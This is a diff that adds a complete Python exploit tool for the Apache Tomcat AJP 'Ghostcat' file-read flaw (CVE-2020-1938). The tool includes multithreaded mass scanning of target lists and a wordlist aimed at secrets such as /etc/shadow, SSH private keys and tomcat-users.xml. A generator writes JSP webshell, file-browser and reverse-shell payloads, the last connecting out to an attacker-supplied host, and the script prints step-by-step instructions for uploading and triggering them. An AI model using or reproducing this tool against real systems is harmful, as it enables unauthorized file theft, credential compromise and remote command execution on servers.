@@ -1,0 +1,1026 @@
+#!/usr/bin/env python3
+"""
+Apache Tomcat AJP Ghostcat File Read Exploit (CVE-2020-1938)
+Complete Production Version
+Author: Converted from Metasploit module
+"""
+
+import socket
+import struct
+import argparse
+import sys
+import os
+from typing import Optional, Tuple, List
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
+import signal
+
+# Global flag for graceful shutdown
+shutdown_flag = False
+
+def signal_handler(sig, frame):
+    global shutdown_flag
+    print("\n[!] Interrupt received, shutting down gracefully...")
+    shutdown_flag = True
+
+signal.signal(signal.SIGINT, signal_handler)
+
+
+class AJPForwardRequest:
+    """Constructs an AJP Forward Request packet"""
+    
+    AJP13_FORWARD_REQUEST = 0x02
+    
+    def __init__(self, rhost: str, filename: str = '/WEB-INF/web.xml'):
+        self.rhost = rhost
+        self.filename = filename
+        
+    def pack_string(self, data: str) -> bytes:
+        """Pack a string with length prefix"""
+        if data is None:
+            return struct.pack('>H', 0xFFFF)
+        encoded = data.encode('utf-8')
+        return struct.pack('>H', len(encoded)) + encoded + b'\x00'
+    
+    def pack_header(self, name: str, value: str) -> bytes:
+        """Pack an HTTP header"""
+        common_headers = {
+            'accept': 0xA001, 'accept-charset': 0xA002, 'accept-encoding': 0xA003,
+            'accept-language': 0xA004, 'authorization': 0xA005, 'connection': 0xA006,
+            'content-type': 0xA007, 'content-length': 0xA008, 'cookie': 0xA009,
+            'cookie2': 0xA00A, 'host': 0xA00B, 'pragma': 0xA00C,
+            'referer': 0xA00D, 'user-agent': 0xA00E
+        }
+        
+        result = b''
+        name_lower = name.lower()
+        
+        if name_lower in common_headers:
+            result += struct.pack('>H', common_headers[name_lower])
+        else:
+            result += self.pack_string(name)
+        
+        result += self.pack_string(value)
+        return result
+    
+    def build_request(self) -> bytes:
+        """Build the complete AJP forward request"""
+        req_body = b''
+        req_body += struct.pack('B', self.AJP13_FORWARD_REQUEST)
+        req_body += struct.pack('B', 2)
+        req_body += self.pack_string('HTTP/1.1')
+        req_body += self.pack_string('/index.txt')
+        req_body += self.pack_string('127.0.0.1')
+        req_body += self.pack_string('localhost')
+        req_body += self.pack_string(self.rhost)
+        req_body += struct.pack('>H', 8080)
+        req_body += struct.pack('B', 0)
+        req_body += struct.pack('>H', 1)
+        req_body += self.pack_header('host', f'{self.rhost}:8080')
+        req_body += struct.pack('B', 0x0A)
+        req_body += self.pack_string('javax.servlet.include.request_uri')
+        req_body += self.pack_string('index')
+        req_body += struct.pack('B', 0x0A)
+        req_body += self.pack_string('javax.servlet.include.path_info')
+        req_body += self.pack_string(self.filename)
+        req_body += struct.pack('B', 0x0A)
+        req_body += self.pack_string('javax.servlet.include.servlet_path')
+        req_body += self.pack_string('/')
+        req_body += struct.pack('B', 0xFF)
+        
+        ajp_packet = b'\x12\x34' + struct.pack('>H', len(req_body)) + req_body
+        return ajp_packet
+
+
+class GhostcatExploit:
+    """Main exploit class"""
+    
+    def __init__(self, rhost: str, rport: int = 8009, filename: str = '/WEB-INF/web.xml', 
+                 timeout: int = 5, verbose: bool = False):
+        self.rhost = rhost
+        self.rport = rport
+        self.filename = filename
+        self.timeout = timeout
+        self.verbose = verbose
+        self.sock = None
+        
+    def log(self, message: str):
+        if self.verbose:
+            print(message)
+        
+    def send_and_receive(self, data: bytes) -> bytes:
+        """Send AJP request and receive response"""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(self.timeout)
+            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            
+            self.log(f"[*] Connecting to {self.rhost}:{self.rport}...")
+            self.sock.connect((self.rhost, self.rport))
+            self.log("[*] Connected successfully")
+            
+            self.sock.sendall(data)
+            
+            response = b''
+            max_reads = 20
+            read_count = 0
+            
+            while read_count < max_reads:
+                try:
+                    chunk = self.sock.recv(4096)
+                    if not chunk:
+                        break
+                    response += chunk
+                    read_count += 1
+                    
+                    if b'\x05' in chunk:
+                        self.log("[*] End response marker detected")
+                        break
+                    
+                    if len(chunk) < 1024:
+                        break
+                        
+                except socket.timeout:
+                    break
+                    
+            return response
+            
+        except socket.timeout:
+            return b''
+        except (ConnectionRefusedError, ConnectionResetError, OSError):
+            return b''
+        except Exception as e:
+            self.log(f"[-] Error: {e}")
+            return b''
+        finally:
+            if self.sock:
+                try:
+                    self.sock.close()
+                except:
+                    pass
+    
+    def parse_response(self, response: bytes) -> Tuple[int, str]:
+        """Parse AJP response and extract file content"""
+        
+        if not response or len(response) < 5:
+            return 0, ""
+        
+        body = ""
+        status = 0
+        pos = 0
+        response_len = len(response)
+        
+        while pos < response_len - 4:
+            if response[pos:pos+2] == b'\x41\x42':
+                pass
+            elif response[pos:pos+2] == b'\x12\x34':
+                pass
+            else:
+                pos += 1
+                continue
+            
+            if pos + 4 > response_len:
+                break
+                
+            packet_length = struct.unpack('>H', response[pos+2:pos+4])[0]
+            
+            if pos + 4 + packet_length > response_len:
+                break
+            
+            packet_data = response[pos+4:pos+4+packet_length]
+            
+            if len(packet_data) == 0:
+                pos += 4 + packet_length
+                continue
+            
+            prefix_code = packet_data[0]
+            
+            if prefix_code == 0x03:
+                if len(packet_data) > 2:
+                    chunk_length = struct.unpack('>H', packet_data[1:3])[0]
+                    if len(packet_data) >= 3 + chunk_length:
+                        body_data = packet_data[3:3+chunk_length]
+                        body += body_data.decode('utf-8', errors='ignore')
+            
+            elif prefix_code == 0x04:
+                if len(packet_data) > 2:
+                    status = struct.unpack('>H', packet_data[1:3])[0]
+            
+            elif prefix_code == 0x05:
+                break
+            
+            pos += 4 + packet_length
+        
+        return status, body
+    
+    def exploit(self) -> Tuple[bool, Optional[str]]:
+        """Execute the exploit"""
+        self.log(f"[*] Target: {self.rhost}:{self.rport}")
+        self.log(f"[*] File: {self.filename}")
+        
+        ajp_request = AJPForwardRequest(self.rhost, self.filename)
+        request_data = ajp_request.build_request()
+        
+        response = self.send_and_receive(request_data)
+        
+        if not response:
+            return False, None
+        
+        status, body = self.parse_response(response)
+        
+        if status == 200 and body:
+            return True, body
+        else:
+            return False, None
+
+
+class GhostcatRCE:
+    """Upload point detection and RCE capabilities"""
+    
+    def __init__(self, rhost: str, rport: int = 8009, timeout: int = 5, verbose: bool = False):
+        self.rhost = rhost
+        self.rport = rport
+        self.timeout = timeout
+        self.verbose = verbose
+        
+    def log(self, message: str):
+        if self.verbose:
+            print(message)
+    
+    def check_upload_directories(self) -> List[str]:
+        """Check common upload directories"""
+        upload_dirs = [
+            '/uploads',
+            '/upload',
+            '/files',
+            '/attachments',
+            '/documents',
+            '/media',
+            '/images',
+            '/tmp',
+            '/temp',
+            '/user-uploads',
+            '/public/uploads',
+            '/static/uploads',
+            '/assets/uploads',
+            '/content/uploads',
+            '/data/uploads',
+        ]
+        
+        print(f"[*] Checking for accessible upload directories...")
+        accessible_dirs = []
+        
+        for upload_dir in upload_dirs:
+            exploit = GhostcatExploit(
+                rhost=self.rhost,
+                rport=self.rport,
+                filename=upload_dir,
+                timeout=self.timeout,
+                verbose=False
+            )
+            
+            success, content = exploit.exploit()
+            if success and content:
+                print(f"[+] Found accessible directory: {upload_dir}")
+                accessible_dirs.append(upload_dir)
+        
+        return accessible_dirs
+    
+    def find_webapps_path(self) -> Optional[str]:
+        """Try to find the webapps path"""
+        common_paths = [
+            '/usr/local/tomcat/webapps/ROOT',
+            '/var/lib/tomcat8/webapps/ROOT',
+            '/var/lib/tomcat9/webapps/ROOT',
+            '/opt/tomcat/webapps/ROOT',
+            '/usr/share/tomcat8/webapps/ROOT',
+            '/usr/share/tomcat9/webapps/ROOT',
+        ]
+        
+        print(f"[*] Attempting to identify webapps path...")
+        
+        for path in common_paths:
+            test_file = f"{path}/WEB-INF/web.xml"
+            exploit = GhostcatExploit(
+                rhost=self.rhost,
+                rport=self.rport,
+                filename=test_file,
+                timeout=self.timeout,
+                verbose=False
+            )
+            
+            success, content = exploit.exploit()
+            if success and content:
+                print(f"[+] Found webapps path: {path}")
+                return path
+        
+        return None
+
+
+def get_default_wordlist():
+    """Return comprehensive list of high-value files"""
+    return [
+        # Critical Configuration Files
+        '/WEB-INF/web.xml',
+        '/META-INF/context.xml',
+        '/WEB-INF/classes/application.properties',
+        '/WEB-INF/classes/application.yml',
+        '/WEB-INF/classes/application.yaml',
+        '/WEB-INF/classes/application-prod.properties',
+        '/WEB-INF/classes/application-dev.properties',
+        '/WEB-INF/classes/hibernate.cfg.xml',
+        '/WEB-INF/classes/jdbc.properties',
+        '/WEB-INF/classes/database.properties',
+        '/WEB-INF/classes/db.properties',
+        '/WEB-INF/classes/config.properties',
+        '/WEB-INF/classes/settings.properties',
+        
+        # Tomcat Configuration
+        '/usr/local/tomcat/conf/tomcat-users.xml',
+        '/usr/local/tomcat/conf/server.xml',
+        '/usr/local/tomcat/conf/web.xml',
+        '/usr/local/tomcat/conf/context.xml',
+        '/opt/tomcat/conf/tomcat-users.xml',
+        '/var/lib/tomcat8/conf/tomcat-users.xml',
+        '/var/lib/tomcat9/conf/tomcat-users.xml',
+        '/etc/tomcat8/tomcat-users.xml',
+        '/etc/tomcat9/tomcat-users.xml',
+        '/etc/tomcat8/server.xml',
+        '/etc/tomcat9/server.xml',
+        
+        # Spring Framework
+        '/WEB-INF/applicationContext.xml',
+        '/WEB-INF/spring-config.xml',
+        '/WEB-INF/spring-security.xml',
+        '/WEB-INF/dispatcher-servlet.xml',
+        
+        # Logging
+        '/WEB-INF/classes/log4j.properties',
+        '/WEB-INF/classes/log4j.xml',
+        '/WEB-INF/classes/log4j2.xml',
+        '/WEB-INF/classes/logback.xml',
+        
+        # System Files
+        '/etc/passwd',
+        '/etc/shadow',
+        '/etc/hosts',
+        '/etc/hostname',
+        '/proc/self/environ',
+        '/proc/self/cmdline',
+        '/proc/version',
+        
+        # SSH and History
+        '/root/.bash_history',
+        '/root/.ssh/id_rsa',
+        '/root/.ssh/authorized_keys',
+        '/home/tomcat/.bash_history',
+        
+        # Logs
+        '/usr/local/tomcat/logs/catalina.out',
+        '/var/log/tomcat8/catalina.out',
+        '/var/log/tomcat9/catalina.out',
+        
+        # Web Files
+        '/WEB-INF/classes/struts.xml',
+        '/WEB-INF/struts-config.xml',
+        '/.env',
+        '/.git/config',
+    ]
+
+
+def load_targets(filename: str) -> List[str]:
+    """Load target IPs from file"""
+    targets = []
+    try:
+        with open(filename, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    targets.append(line)
+        print(f"[*] Loaded {len(targets)} targets from {filename}")
+        return targets
+    except FileNotFoundError:
+        print(f"[-] File not found: {filename}")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Error reading targets file: {e}")
+        sys.exit(1)
+
+
+def load_wordlist(filename: str) -> List[str]:
+    """Load wordlist from file"""
+    wordlist = []
+    try:
+        with open(filename, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    wordlist.append(line)
+        
+        if len(wordlist) == 0:
+            print(f"[-] Warning: Wordlist file is empty or contains only comments")
+            return []
+        
+        print(f"[*] Loaded {len(wordlist)} files from wordlist: {filename}")
+        return wordlist
+        
+    except FileNotFoundError:
+        print(f"[-] Wordlist file not found: {filename}")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Error reading wordlist: {e}")
+        sys.exit(1)
+
+
+def parse_target(target: str, default_port: int) -> Tuple[str, int]:
+    """Parse target string (supports IP or IP:PORT format)"""
+    if ':' in target:
+        parts = target.split(':')
+        return parts[0], int(parts[1])
+    return target, default_port
+
+
+def exploit_single_file(target: str, port: int, filename: str, timeout: int, 
+                       verbose: bool) -> dict:
+    """Test single file on single target"""
+    
+    if shutdown_flag:
+        return None
+    
+    result = {
+        'target': target,
+        'port': port,
+        'file': filename,
+        'success': False,
+        'content': None,
+        'size': 0
+    }
+    
+    try:
+        exploit = GhostcatExploit(
+            rhost=target,
+            rport=port,
+            filename=filename,
+            timeout=timeout,
+            verbose=verbose
+        )
+        
+        success, content = exploit.exploit()
+        
+        if success and content:
+            result['success'] = True
+            result['content'] = content
+            result['size'] = len(content)
+        
+    except Exception:
+        pass
+    
+    return result
+
+
+def run_wordlist_scan(target: str, port: int, wordlist: List[str], 
+                     timeout: int, verbose: bool, output_dir: Optional[str],
+                     threads: int):
+    """Scan single target with multiple files"""
+    
+    print(f"\n{'='*60}")
+    print(f"Scanning: {target}:{port}")
+    print(f"Files: {len(wordlist)} | Threads: {threads}")
+    print('='*60)
+    
+    if len(wordlist) == 0:
+        print("[-] ERROR: Wordlist is empty! No files to test.")
+        return {'found': [], 'tested': 0}
+    
+    results = {'found': [], 'tested': 0, 'target': target, 'port': port}
+    start_time = time.time()
+    
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {
+            executor.submit(exploit_single_file, target, port, filename, timeout, verbose): filename
+            for filename in wordlist
+        }
+        
+        for future in as_completed(futures):
+            if shutdown_flag:
+                executor.shutdown(wait=False)
+                break
+            
+            filename = futures[future]
+            results['tested'] += 1
+            
+            try:
+                result = future.result()
+                
+                if result and result['success']:
+                    print(f"\n[+] FOUND: {filename} ({result['size']} bytes)")
+                    
+                    if output_dir:
+                        try:
+                            os.makedirs(output_dir, exist_ok=True)
+                            safe_name = filename.replace('/', '_').replace('..', '_')
+                            output_file = os.path.join(output_dir, f"{target}_{port}_{safe_name}.txt")
+                            
+                            with open(output_file, 'w', encoding='utf-8') as f:
+                                f.write(result['content'])
+                            result['output_file'] = output_file
+                            print(f"    Saved to: {output_file}")
+                        except Exception as e:
+                            if verbose:
+                                print(f"    [-] Save error: {e}")
+                    
+                    results['found'].append(result)
+                
+                if not verbose and results['tested'] % 10 == 0:
+                    elapsed = time.time() - start_time
+                    rate = results['tested'] / elapsed if elapsed > 0 else 0
+                    eta = (len(wordlist) - results['tested']) / rate if rate > 0 else 0
+                    print(f"\r[*] Progress: {results['tested']}/{len(wordlist)} ({rate:.1f} files/s, ETA: {eta:.0f}s)   ", end='', flush=True)
+                    
+            except Exception as e:
+                if verbose:
+                    print(f"[-] Error with {filename}: {e}")
+    
+    if not verbose:
+        print()
+    
+    elapsed = time.time() - start_time
+    
+    print(f"\n{'=' * 60}")
+    print(f"SCAN SUMMARY - {target}:{port}")
+    print("=" * 60)
+    print(f"Files tested: {results['tested']}")
+    print(f"Files found: {len(results['found'])}")
+    print(f"Time elapsed: {elapsed:.2f}s")
+    if elapsed > 0:
+        print(f"Average rate: {results['tested']/elapsed:.1f} files/s")
+    
+    if results['found']:
+        print("\n[+] Found files:")
+        for r in results['found']:
+            print(f"    {r['file']} ({r['size']} bytes)")
+    
+    return results
+
+
+def scan_for_upload_points(target: str, port: int, timeout: int, verbose: bool, 
+                           output_dir: Optional[str]) -> dict:
+    """Comprehensive scan for upload points and execution paths"""
+    
+    results = {
+        'target': target,
+        'upload_forms': [],
+        'upload_dirs': [],
+        'config_files': {},
+    }
+    
+    print(f"\n[*] Scanning {target}:{port} for upload capabilities...")
+    print("=" * 60)
+    
+    # Check web.xml
+    print("\n[*] Step 1: Checking web.xml for upload configurations...")
+    exploit = GhostcatExploit(target, port, '/WEB-INF/web.xml', timeout, verbose)
+    success, content = exploit.exploit()
+    
+    if success and content:
+        results['config_files']['web.xml'] = content
+        
+        upload_indicators = [
+            'multipart/form-data',
+            'file-upload',
+            'FileUpload',
+            'MultipartConfig',
+            'commons-fileupload',
+            'max-file-size',
+        ]
+        
+        found_indicators = [ind for ind in upload_indicators if ind.lower() in content.lower()]
+        
+        if found_indicators:
+            print(f"[+] Found upload indicators in web.xml: {', '.join(found_indicators)}")
+            results['upload_forms'].extend(found_indicators)
+    
+    # Check Spring configs
+    print("\n[*] Step 2: Checking Spring configuration...")
+    spring_files = [
+        '/WEB-INF/applicationContext.xml',
+        '/WEB-INF/spring-servlet.xml',
+        '/WEB-INF/dispatcher-servlet.xml',
+        '/WEB-INF/classes/application.properties',
+    ]
+    
+    for spring_file in spring_files:
+        exploit = GhostcatExploit(target, port, spring_file, timeout, False)
+        success, content = exploit.exploit()
+        
+        if success and content:
+            results['config_files'][spring_file] = content
+            
+            upload_config = [
+                'multipartResolver',
+                'CommonsMultipartResolver',
+                'spring.servlet.multipart',
+            ]
+            
+            for config in upload_config:
+                if config in content:
+                    print(f"[+] Found upload config in {spring_file}: {config}")
+                    results['upload_forms'].append(f"{spring_file}:{config}")
+    
+    # Check upload directories
+    print("\n[*] Step 3: Probing for upload directories...")
+    rce = GhostcatRCE(target, port, timeout, verbose)
+    results['upload_dirs'] = rce.check_upload_directories()
+    
+    # Save results
+    if output_dir and results['config_files']:
+        try:
+            os.makedirs(output_dir, exist_ok=True)
+            
+            for filename, content in results['config_files'].items():
+                safe_name = filename.replace('/', '_')
+                output_file = os.path.join(output_dir, f"{target}_{port}_{safe_name}")
+                with open(output_file, 'w') as f:
+                    f.write(content)
+            
+            summary_file = os.path.join(output_dir, f'{target}_{port}_upload_analysis.txt')
+            with open(summary_file, 'w') as f:
+                f.write(f"Upload Point Analysis for {target}:{port}\n")
+                f.write("=" * 60 + "\n\n")
+                
+                f.write("Upload Forms/Configurations Found:\n")
+                if results['upload_forms']:
+                    for form in results['upload_forms']:
+                        f.write(f"  - {form}\n")
+                else:
+                    f.write("  None found\n")
+                
+                f.write("\nAccessible Upload Directories:\n")
+                if results['upload_dirs']:
+                    for dir in results['upload_dirs']:
+                        f.write(f"  - {dir}\n")
+                else:
+                    f.write("  None found\n")
+            
+            print(f"\n[*] Analysis saved to: {summary_file}")
+            
+        except Exception as e:
+            print(f"[-] Error saving results: {e}")
+    
+    print("\n" + "=" * 60)
+    print("UPLOAD POINT ANALYSIS SUMMARY")
+    print("=" * 60)
+    print(f"Upload forms/configs found: {len(results['upload_forms'])}")
+    print(f"Accessible directories: {len(results['upload_dirs'])}")
+    print(f"Config files retrieved: {len(results['config_files'])}")
+    
+    if results['upload_forms']:
+        print("\n[+] Potential upload points:")
+        for form in results['upload_forms']:
+            print(f"    {form}")
+    
+    if results['upload_dirs']:
+        print("\n[+] Accessible directories:")
+        for dir in results['upload_dirs']:
+            print(f"    {dir}")
+    
+    return results
+
+
+def generate_jsp_payloads():
+    """Generate various JSP payloads for testing"""
+    
+    payloads = {
+        'simple_webshell': '''<%@ page import="java.io.*" %>
+<% 
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        out.println("<pre>");
+        while ((line = br.readLine()) != null) {
+            out.println(line);
+        }
+        out.println("</pre>");
+    } else {
+        out.println("Usage: ?cmd=whoami");
+    }
+%>''',
+        
+        'file_browser': '''<%@ page import="java.io.*" %>
+<%
+    String path = request.getParameter("path");
+    if (path == null) path = "/";
+    File dir = new File(path);
+    out.println("<h3>Directory: " + path + "</h3>");
+    out.println("<pre>");
+    File[] files = dir.listFiles();
+    if (files != null) {
+        for (File f : files) {
+            String name = f.getName();
+            if (f.isDirectory()) name += "/";
+            out.println("<a href='?path=" + f.getAbsolutePath() + "'>" + name + "</a>");
+        }
+    }
+    out.println("</pre>");
+%>''',
+        
+        'reverse_shell': '''<%@ page import="java.io.*,java.net.*" %>
+<%
+    // Usage: ?host=ATTACKER_IP&port=4444
+    String host = request.getParameter("host");
+    String portStr = request.getParameter("port");
+    
+    if (host != null && portStr != null) {
+        try {
+            int port = Integer.parseInt(portStr);
+            Socket s = new Socket(host, port);
+            Process p = Runtime.getRuntime().exec("/bin/bash");
+            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+            while(!s.isClosed()) {
+                while(pi.available()>0) so.write(pi.read());
+                while(pe.available()>0) so.write(pe.read());
+                while(si.available()>0) po.write(si.read());
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+                try { p.exitValue(); break; } catch (Exception e){}
+            }
+            p.destroy();
+            s.close();
+        } catch (Exception e) {
+            out.println("Error: " + e.getMessage());
+        }
+    } else {
+        out.println("Usage: ?host=YOUR_IP&port=4444");
+    }
+%>''',
+
+        'info_page': '''<%@ page import="java.util.*" %>
+<html>
+<head><title>Server Info</title></head>
+<body>
+<h2>Server Information</h2>
+<pre>
+Server: <%= application.getServerInfo() %>
+Java Version: <%= System.getProperty("java.version") %>
+OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %>
+User: <%= System.getProperty("user.name") %>
+Working Dir: <%= System.getProperty("user.dir") %>
+</pre>
+</body>
+</html>''',
+    }
+    
+    return payloads
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='Apache Tomcat AJP Ghostcat Exploit (CVE-2020-1938)',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  # Single target, single file
+  python3 ghostcat.py -t 192.168.1.100 -f /WEB-INF/web.xml -o results/
+  
+  # Single target with default wordlist
+  python3 ghostcat.py -t 192.168.1.100 -w -o results/
+  
+  # Single target with custom wordlist
+  python3 ghostcat.py -t 192.168.1.100 -W my_files.txt -o results/
+  
+  # Multiple targets with wordlist
+  python3 ghostcat.py -T targets.txt -W wordlist.txt -o results/ --threads 50
+  
+  # Scan for upload points
+  python3 ghostcat.py -t 192.168.1.100 --scan-uploads -o results/
+  
+  # Generate JSP payloads
+  python3 ghostcat.py --generate-jsp -o payloads/
+
+Wordlist file format (one per line):
+  /WEB-INF/web.xml
+  /etc/passwd
+  /usr/local/tomcat/conf/tomcat-users.xml
+  # Comments start with #
+
+Targets file format (one per line):
+  192.168.1.100
+  192.168.1.101:8009
+  10.10.10.50
+  # Comments are ignored
+        """
+    )
+    
+    # Target options
+    parser.add_argument('-t', '--target', help='Single target (IP or IP:PORT)')
+    parser.add_argument('-T', '--target-file', help='File containing targets (one per line)')
+    parser.add_argument('--generate-jsp', action='store_true', help='Generate JSP payloads only')
+    
+    # Scan options
+    parser.add_argument('--scan-uploads', action='store_true', 
+                       help='Scan for file upload points and configurations')
+    
+    # File options
+    file_group = parser.add_mutually_exclusive_group()
+    file_group.add_argument('-f', '--file', help='Single file to read')
+    file_group.add_argument('-w', '--wordlist', action='store_true', 
+                           help='Use default wordlist (~60 high-value files)')
+    file_group.add_argument('-W', '--wordlist-file', help='Custom wordlist file')
+    
+    # Performance options
+    parser.add_argument('-p', '--port', type=int, default=8009, 
+                       help='AJP port (default: 8009)')
+    parser.add_argument('-o', '--output', help='Output directory for results')
+    parser.add_argument('--timeout', type=int, default=5, 
+                       help='Socket timeout in seconds (default: 5)')
+    parser.add_argument('--threads', type=int, default=50, 
+                       help='Number of threads (default: 50)')
+    parser.add_argument('-v', '--verbose', action='store_true', 
+                       help='Verbose output (shows all attempts)')
+    
+    args = parser.parse_args()
+    
+    print("=" * 60)
+    print("Apache Tomcat AJP Ghostcat Exploit (CVE-2020-1938)")
+    print("=" * 60)
+    print()
+    
+    # Generate JSP payloads
+    if args.generate_jsp:
+        payloads = generate_jsp_payloads()
+        output_dir = args.output or 'jsp_payloads'
+        os.makedirs(output_dir, exist_ok=True)
+        
+        print(f"[*] Generating JSP payloads to: {output_dir}")
+        
+        for name, code in payloads.items():
+            filename = os.path.join(output_dir, f'{name}.jsp')
+            with open(filename, 'w') as f:
+                f.write(code)
+            print(f"[+] Generated: {filename}")
+        
+        print(f"\n[+] Generated {len(payloads)} JSP payloads")
+        print("\nUsage instructions:")
+        print("1. Upload these JSP files through any file upload functionality")
+        print("2. Access them via: http://target:8080/uploads/<filename>.jsp")
+        print("3. For webshell: ?cmd=whoami")
+        print("4. For file browser: ?path=/etc")
+        print("5. For reverse shell: ?host=YOUR_IP&port=4444")
+        sys.exit(0)
+    
+    # Validate required arguments
+    if not args.target and not args.target_file:
+        print("[-] Error: Must specify -t (single target) or -T (target file)")
+        parser.print_help()
+        sys.exit(1)
+    
+    # Upload scanning mode
+    if args.scan_uploads:
+        if args.target:
+            target, port = parse_target(args.target, args.port)
+            scan_for_upload_points(target, port, args.timeout, args.verbose, args.output)
+            sys.exit(0)
+        elif args.target_file:
+            targets = load_targets(args.target_file)
+            for target_str in targets:
+                target, port = parse_target(target_str, args.port)
+                scan_for_upload_points(target, port, args.timeout, args.verbose, args.output)
+            sys.exit(0)
+    
+    # Determine files to test
+    files_to_test = []
+    
+    if args.file:
+        files_to_test = [args.file]
+        print(f"[*] Testing single file: {args.file}")
+    elif args.wordlist:
+        files_to_test = get_default_wordlist()
+        print(f"[*] Using default wordlist ({len(files_to_test)} files)")
+    elif args.wordlist_file:
+        files_to_test = load_wordlist(args.wordlist_file)
+    else:
+        files_to_test = ['/WEB-INF/web.xml']
+        print(f"[*] No wordlist specified, testing default file")
+    
+    if len(files_to_test) == 0:
+        print("[-] Error: No files to test!")
+        sys.exit(1)
+    
+    # Single target mode
+    if args.target:
+        target, port = parse_target(args.target, args.port)
+        
+        if len(files_to_test) == 1:
+            # Single file test
+            print(f"[*] Target: {target}:{port}")
+            print(f"[*] File: {files_to_test[0]}")
+            print()
+            
+            result = exploit_single_file(target, port, files_to_test[0], args.timeout, args.verbose)
+            
+            if result and result['success']:
+                print(f"\n[+] SUCCESS!")
+                print("=" * 60)
+                print(result['content'])
+                print("=" * 60)
+                
+                if args.output:
+                    os.makedirs(args.output, exist_ok=True)
+                    output_file = os.path.join(args.output, f"{target}_{port}_result.txt")
+                    with open(output_file, 'w') as f:
+                        f.write(result['content'])
+                    print(f"\n[+] Saved to: {output_file}")
+                sys.exit(0)
+            else:
+                print("\n[-] Exploit failed - file not found or target not vulnerable")
+                sys.exit(1)
+        else:
+            # Wordlist scan
+            run_wordlist_scan(target, port, files_to_test, args.timeout, 
+                            args.verbose, args.output, args.threads)
+            sys.exit(0)
+    
+    # Multi-target mode
+    elif args.target_file:
+        targets = load_targets(args.target_file)
+        
+        if not targets:
+            print("[-] No targets loaded")
+            sys.exit(1)
+        
+        print(f"\n[*] Multi-target mode")
+        print(f"[*] Targets: {len(targets)}")
+        print(f"[*] Files per target: {len(files_to_test)}")
+        print(f"[*] Total tests: {len(targets) * len(files_to_test)}")
+        print()
+        
+        overall_start = time.time()
+        all_results = []
+        
+        for i, target_str in enumerate(targets, 1):
+            if shutdown_flag:
+                break
+            
+            target, port = parse_target(target_str, args.port)
+            print(f"\n[{i}/{len(targets)}] Processing {target}:{port}")
+            
+            results = run_wordlist_scan(target, port, files_to_test, args.timeout,
+                                       args.verbose, args.output, args.threads)
+            all_results.append(results)
+        
+        # Overall summary
+        overall_elapsed = time.time() - overall_start
+        total_found = sum(len(r['found']) for r in all_results)
+        total_tested = sum(r['tested'] for r in all_results)
+        
+        print(f"\n\n{'='*60}")
+        print("OVERALL SCAN SUMMARY")
+        print('='*60)
+        print(f"Targets scanned: {len(all_results)}")
+        print(f"Total files tested: {total_tested}")
+        print(f"Total files found: {total_found}")
+        print(f"Total time: {overall_elapsed:.2f}s")
+        if overall_elapsed > 0:
+            print(f"Average rate: {total_tested/overall_elapsed:.1f} tests/s")
+        
+        # Show which targets had findings
+        targets_with_findings = [r for r in all_results if r['found']]
+        if targets_with_findings:
+            print(f"\n[+] Vulnerable targets ({len(targets_with_findings)}):")
+            for r in targets_with_findings:
+                print(f"    {r['target']}:{r['port']} - {len(r['found'])} files found")
+        
+        # Save overall summary
+        if args.output:
+            try:
+                os.makedirs(args.output, exist_ok=True)
+                summary_file = os.path.join(args.output, 'overall_summary.txt')
+                with open(summary_file, 'w') as f:
+                    f.write("Ghostcat Overall Scan Summary\n")
+                    f.write("=" * 60 + "\n\n")
+                    f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write(f"Targets scanned: {len(all_results)}\n")
+                    f.write(f"Total tests: {total_tested}\n")
+                    f.write(f"Files found: {total_found}\n")
+                    f.write(f"Duration: {overall_elapsed:.2f}s\n\n")
+                    
+                    if targets_with_findings:
+                        f.write("Vulnerable Targets:\n")
+                        for r in targets_with_findings:
+                            f.write(f"\n{r['target']}:{r['port']}\n")
+                            for found in r['found']:
+                                f.write(f"  - {found['file']} ({found['size']} bytes)\n")
+                
+                print(f"\n[*] Overall summary saved to: {summary_file}")
+            except Exception as e:
+                print(f"[-] Error saving summary: {e}")
+        
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    main()
